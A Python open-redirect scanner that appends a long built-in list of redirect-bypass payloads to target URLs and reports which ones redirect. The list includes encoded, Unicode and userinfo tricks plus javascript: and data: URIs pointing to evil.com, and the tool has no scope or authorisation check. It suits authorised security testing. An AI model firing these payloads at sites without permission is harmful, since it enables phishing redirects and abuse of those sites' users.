import os
import requests
from colorama import init, Fore, Style
import concurrent.futures
import time
import signal
from urllib3.exceptions import LocationParseError

init()

banner = r"""

    /========================================================================================================\
    ||                                                                                                      ||
    ||                                                                                                      ||
    ||   ___  _ __   ___ _ __    _ __ ___  __| (_)_ __ ___  ___| |_   ___  ___ __ _ _ __  _ __   ___ _ __   ||
    ||  / _ \| '_ \ / _ \ '_ \  | '__/ _ \/ _` | | '__/ _ \/ __| __| / __|/ __/ _` | '_ \| '_ \ / _ \ '__|  ||
    || | (_) | |_) |  __/ | | | | | |  __/ (_| | | | |  __/ (__| |_  \__ \ (_| (_| | | | | | | |  __/ |     ||
    ||  \___/| .__/ \___|_| |_| |_|  \___|\__,_|_|_|  \___|\___|\__| |___/\___\__,_|_| |_|_| |_|\___|_|     ||
    ||       |_|                                                                                            ||
    ||                                                                                                      ||
    ||                                                                    -github.com/vijayshankar22        ||
    ||                                                                                                      ||
    \========================================================================================================/

"""

default_payloads = [
    "//google.com",
    "/google.com",
    "//google%E3%80%82com",
    "\/\/google.com",
    "/\/google.com",
    "//google%00.com",
    "http://google.com:80#@example.com",
    "http://google.com:80?@example.com",
    "http://3H6k7lIAiqjfNeN@example.com@google.com",
    "http://XY>.7d8T\\205pZM@example.com@google.com",
    "http://example.com+&@google.com#+@example.com",
    "http://google.com\\texample.com",
    "<>//google.com",
    "/http://google.com",
    "%01https://google.com",
    "/%2f%2fgoogle.com",
    "/google.com/%2f%2e%2e",
    "/http:/google.com",
    "/.google.com",
    "///;@google.com",
    "///google.com",
    "/////google.com",
    "https://\\google.com",
    "https://\\example.com@google.com",
    "/https://\\google.com",
    "/https://\\example.com@google.com",
    "//example.com@google.com/%2f..",
    "///google.com/%2f..",
    "///example.com@google.com/%2f..",
    "////google.com/%2f..",
    "https://google.com/%2f..",
    "https://example.com@google.com/%2f..",
    "/https://google.com/%2f..",
    "/https://example.com@google.com/%2f..",
    "//google.com/%2f%2e%2e",
    "//example.com@google.com/%2f%2e%2e",
    "///google.com/%2f%2e%2e",
    "///example.com@google.com/%2f%2e%2e",
    "////google.com/%2f%2e%2e",
    "/http://example.com",
    "/http:/example.com",
    "/https:/\\example.com",
    "/https://%09/example.com",
    "/https://\\example.com",
    "/https:///example.com/%2e%2e",
    "/https:///example.com/%2f%2e%2e",
    "/https://example.com",
    "/https://example.com/",
    "/https://example.com/%2e%2e",
    "/https://example.com/%2e%2e%2f",
    "/https://example.com/%2f%2e%2e",
    "/https://example.com/%2f..",
    "/https://example.com//",
    "/https:example.com",
    "/%09/example.com",
    "/%2f%2fexample.com",
    "/%2f\\%2fgoogle.com",
    "/\\example.com",
    "/%68%74%74%70%3a%2f%2fgoogle.com",
    "/.example.com",
    "//%09/example.com",
    "//\\example.com",
    "///%09/example.com",
    "///\\example.com",
    "////%09/example.com",
    "////\\example.com",
    "/////example.com",
    "////;@example.com",
    "////example.com",
    "\\example.com/%2f%2e%2e",
    "https://:@bing.com\\@example.com",
    "http://bing.com:80#@example.com",
    "http://bing.com:80?@example.com",
    "http://3H6k7lIAiqjfNeN@example.com@bing.com",
    "http://XY>.7d8T\\205pZM@example.com@bing.com",
    "http://example.com+&@bing.com#+@example.com",
    "http://bing.com\\texample.com",
    "//bing.com:80#@example.com",
    "//bing.com:80?@example.com",
    "//3H6k7lIAiqjfNeN@example.com@bing.com",
    "//XY>.7d8T\\205pZM@example.com@bing.com",
    "//example.com+&@bing.com#+@example.com",
    "//bing.com\\texample.com",
    "http://;@bing.com",
    "@bing.com",
    "data:text/html;base64,aHR0cHM6Ly93d3cuYmluZy5jb20=",
    "http://bing.com/%2f/.example.com",
    "http://bing.com/\\example.com",
    "http://bing.com%3F.example.com",
    "http://bing.com%23.example.com",
    "/https:/\\bing.com",
    "/http://bing.com",
    "/%2f%2fbing.com",
    "/bing.com/%2f%2e%2e",
    "/http:/bing.com",
    "/.bing.com",
    "///;@bing.com",
    "///bing.com",
    "/////bing.com",
    "/%0D/bing.com",
    "/%0D%0Ahttp://bing.com",
    "//bing%E3%80%82com",
    "%20//bing.com",
    "////example.com@bing.com/%2f%2e%2e",
    "https:///bing.com/%2f%2e%2e",
    "https:///example.com@bing.com/%2f%2e%2e",
    "/https://bing.com/%2f%2e%2e",
    "/https://example.com@bing.com/%2f%2e%2e",
    "/https:///bing.com/%2f%2e%2e",
    "/https:///example.com@bing.com/%2f%2e%2e",
    "/%09/bing.com",
    "/%09/example.com@bing.com",
    "//%09/bing.com",
    "//%09/example.com@bing.com",
    "///%09/bing.com",
    "///%09/example.com@bing.com",
    "////%09/bing.com",
    "////%09/example.com@bing.com",
    "https://%09/bing.com",
    "https://%09/example.com@bing.com",
    "/\\bing.com",
    "/\\example.com@bing.com",
    "//\\bing.com",
    "//\\example.com@bing.com",
    "///\\bing.com",
    "///\\example.com@bing.com",
    "////\\bing.com",
    "////\\example.com@bing.com",
    "https://\\bing.com",
    "https://\\example.com@bing.com",
    "/https://\\bing.com",
    "/https://\\example.com@bing.com",
    "https://bing.com",
    "https://example.com@bing.com",
    "//bing.com",
    "https:bing.com",
    "https://example.com/https://bing.com",
    "http://[::204.79.197.200]",
    "http://example.com@[::204.79.197.200]",
    "http://3H6k7lIAiqjfNeN@[::204.79.197.200]",
    "http:0xd83ad6ce",
    "http:example.com@0x62696e672e636f6d",
    "〱bing.com",
    "〵bing.com",
    "ゝbing.com",
    "ーbing.com",
    "ｰbing.com",
    "/〱bing.com",
    "/〵bing.com",
    "/ゝbing.com",
    "/ーbing.com",
    "/ｰbing.com",
    "%68%74%74%70%73%3a%2f%2f%77%77%77%2e%62%69%6e%67%2e%63%6f%6d",
    "http://%77%77%77%2e%62%69%6e%67%2e%63%6f%6d",
    "<>//bing.com",
    "//bing.com\\@example.com",
    "///example.com@bing.com/%2f%2e%2e",
    "////bing.com/%2f%2e%2e",
    "https://bing.com/%2f%2e%2e",
    "https://example.com@bing.com/%2f%2e%2e",
    "/https://bing.com/%2f%2e%2e",
    "/https://example.com@bing.com/%2f%2e%2e",
    "//bing.com/",
    "///bing.com/",
    "////bing.com/",
    "https://bing.com/",
    "/https://bing.com/",
    "//bing.com//",
    "///bing.com//",
    "////bing.com//",
    "https://bing.com//",
    "/https://bing.com//",
    "//bing.com/%2e%2e%2f",
    "///bing.com/%2e%2e%2f",
    "////bing.com/%2e%2e%2f",
    "https://bing.com/%2e%2e%2f",
    "///bing.com/%2e%2e",
    "////bing.com/%2e%2e",
    "https:///bing.com/%2e%2e",
    "/https://bing.com/%2e%2e",
    "///bing.com/%2f%2e%2e",
    "////bing.com/%2f%2e%2e",
    "bing.com/",
    "https://www.bing.com",
    "www.bing.com",
    "%2520%252f%252fbing.com",
    ".bing.com",
    "..bing.com",
    "%%2f2fbing.com",
    "///example.com@bing.com/%2f..",
    "//bing.com/%2f",
    "////bing.com/%2f..",
    "//bing.com/%2f%2e%2e",
    "//evil.com@\\u002F\\u002Fexample.com",
    "/\\evil.com/%2f%2e%2e",
    "https://evil.com:443\\@example.com",
    "//%E2%80%A4evil.com",
    "data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbi5ocmVmPSJodHRwczovL2V2aWwuY29tIjs8L3NjcmlwdD4=",
    "/%09//evil.com/%2f%2e%2e",
    "http://evil.com%252f%252fexample.com",
    "//evil.com%23@bing.com",
    "https://evil.com/?@example.com",
    "//sub.evil.com%2F%40example.com",
    "javascript:location.href='https://evil.com'",
    "//evil.com:80%5Cexample.com",
    "/%2f%5cevil.com/%2e%2e",
    "https://evil.com/%2f%252e%252e",
    "//evil%252ecom",
    "http://[::1]/@evil.com",
    "/%E2%80%8B/evil.com",
    "//evil.com/%2F%252Fexample.com%252F",
    "https://evil.com#@bing.com",
    "//xn--evil-3ve.com",
    "/%00evil.com",
    "//evil.com%2F%2525%2525example.com",
    "https://evil%25%32%65com",
    "/\\u0065vil.com",
    "//evil.com:80%2F%5C%5Cexample.com",
    "data:application/x-javascript,window.location='https://evil.com'",
    "//%F0%9F%98%88.evil.com",
    "/%2f%2fsub.evil.com%2f@bing.com",
    "https://evil.com/%2F%252F%252Fexample.com",
    "//evil.com@%E2%80%AEexample.com",
    "/javascript://%0deval(location='https://evil.com')",
    "//evil.com%252F%252F%252F%252Fbing.com",
    "https://evil.com%23%40example.com%2F",
    "//sub.sub.evil.com%2F%40example.com",
    "/%E2%81%A0evil.com",
    "http://evil.com%2F%252F%252F%252F%252Fexample.com",
    "//evil.com%252e%252e%252Fexample.com",
    "https://:@evil.com%5C%5Cexample.com",
    "//evil.com/%0Aexample.com",
    "javascript:void(document.location='https://evil.com')",
    "//bing.com@\\u002F\\u002Fexample.com",
    "/\\bing.com/%2f%2e%2e",
    "https://bing.com:443\\@example.com",
    "//example.com@\\u002F\\u002Fbing.com",
    "/\\example.com/%2f%2e%2e",
    "https://example.com:443\\@bing.com"
]


def print_banner():
    print(Fore.CYAN + banner + Style.RESET_ALL)

def get_urls():

    print(Fore.CYAN + "1. Enter a single url" + Style.RESET_ALL)
    print(Fore.CYAN + "2. Select urls from file" + Style.RESET_ALL)
    print("")
    
    choice = input(Fore.LIGHTGREEN_EX + "Enter a number : " + Style.RESET_ALL)
    urls = []
    if choice == '1':
        url = input(Fore.CYAN + "Enter the target URL (e.g., https://example.com/?redirect=): " + Style.RESET_ALL)
        urls.append(url.strip())
    elif choice == '2':
        file_path = input(Fore.CYAN + "Enter the path to the .txt file with URLs: " + Style.RESET_ALL)
        try:
            with open(file_path, 'r') as file:
                urls = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print(Fore.RED + f"Error: File '{file_path}' not found!" + Style.RESET_ALL)
            return []
    else:
        print(Fore.RED + "Invalid choice! Using single URL input." + Style.RESET_ALL)
        url = input(Fore.CYAN + "Enter the target URL (e.g., https://example.com/?redirect=): " + Style.RESET_ALL)
        urls.append(url.strip())
    return urls


def get_payloads():
    
    choice = input(Fore.CYAN + "Enter '1' to use default payloads or '2' to provide a payload .txt file: " + Style.RESET_ALL)
    payloads = default_payloads
    if choice == '2':
        file_path = input(Fore.CYAN + "Enter the path to the payload .txt file: " + Style.RESET_ALL)
        try:
            with open(file_path, 'r') as file:
                payloads = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print(Fore.RED + f"Error: File '{file_path}' not found! Using default payloads." + Style.RESET_ALL)
    return payloads


def get_threads():
    try:
        threads = int(input(Fore.CYAN + "Enter number of threads (default 5): " + Style.RESET_ALL) or 5)
        return max(1, threads)
    except ValueError:
        print(Fore.RED + "Invalid input! Using 5 threads." + Style.RESET_ALL)
        return 5
    

def check_redirect(url, payload):
    test_url = url + payload.strip()
    try:
        response = requests.get(test_url, verify=True, allow_redirects=True, timeout=5)

        if response.history:
            final_url = response.url.lower()
            is_vulnerable = (
                final_url.startswith('http://www.bing.com') or
                final_url.startswith('https://www.bing.com') or
                final_url.startswith('http://example.com') or
                final_url.startswith('https://example.com') or
                final_url.startswith('http://google.com') or
                final_url.startswith('https://google.com') or
                final_url.startswith('http://evil.com') or
                final_url.startswith('https://evil.com')
            )
            return {
                "test_url": test_url,
                "final_url": response.url,
                "is_redirect": is_vulnerable,
                "payload": payload,
                "status_code": response.status_code
            }
        else:
            return {
                "test_url": test_url,
                "final_url": response.url,
                "is_redirect": False,
                "payload": payload,
                "status_code": response.status_code
            }

    except (requests.RequestException, LocationParseError) as e:
        return {
            "test_url": test_url,
            "final_url": None,
            "is_redirect": False,
            "payload": payload,
            "error": f"Request failed: {str(e)}"
        }

def scan_urls(urls, payloads, threads):

    results = []
    print(Fore.CYAN + "\nStarting scan...\n" + Style.RESET_ALL)
    
    for url in urls:
        print(Fore.CYAN + f"\nScanning {url}..." + Style.RESET_ALL)
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:

            future_to_payload = {executor.submit(check_redirect, url, payload): payload for payload in payloads}
            for future in concurrent.futures.as_completed(future_to_payload):
                result = future.result()
                results.append(result)

                if result["is_redirect"]:
                    print(Fore.GREEN + f"[VULNERABLE] {result['test_url']} -> Redirects to: {result['final_url']} (Status: {result['status_code']})" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"[SAFE] {result['test_url']} -> {result['final_url'] or 'Failed'} (Status: {result.get('status_code', 'N/A')})" + Style.RESET_ALL)
                time.sleep(0.1)
    
    return results

def print_summary(results):

    print(Fore.CYAN + "\n--- Scan Summary ---" + Style.RESET_ALL)
    total_scanned = len(results)
    vulnerable = [r for r in results if r["is_redirect"]]
    total_vulnerable = len(vulnerable)
    
    print(f"Total URLs scanned: {total_scanned}")
    print(f"Total Redirects found: {total_vulnerable}")
    
    if total_vulnerable > 0:
        print(Fore.GREEN + "\nVulnerable URLs:" + Style.RESET_ALL)
        print("")
        for result in vulnerable:
            print(f"URL: {result['test_url']}")
            print(f"Payload: {result['payload']}")
            print(f"Redirects to: {result['final_url']}")
            print(f"Status Code: {result['status_code']}")
            print("-" * 50)

def ctrl_c(signum, rfm):

    print(Fore.CYAN + "\nExiting..." + Style.RESET_ALL)
    exit()

def main():

    signal.signal(signal.SIGINT, ctrl_c)
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print_banner()

        urls = get_urls()
        if not urls:
            print(Fore.RED + "No valid URLs to scan! Exiting." + Style.RESET_ALL)
            break
        
        payloads = get_payloads()
        threads = get_threads()
        
        results = scan_urls(urls, payloads, threads)
        
        print_summary(results)
        
        rerun = input(Fore.CYAN + "\nRun the scanner again? (y/n): " + Style.RESET_ALL).lower()
        if rerun != 'y':
            print(Fore.CYAN + "Exiting..." + Style.RESET_ALL)
            break

if __name__ == "__main__":
    main()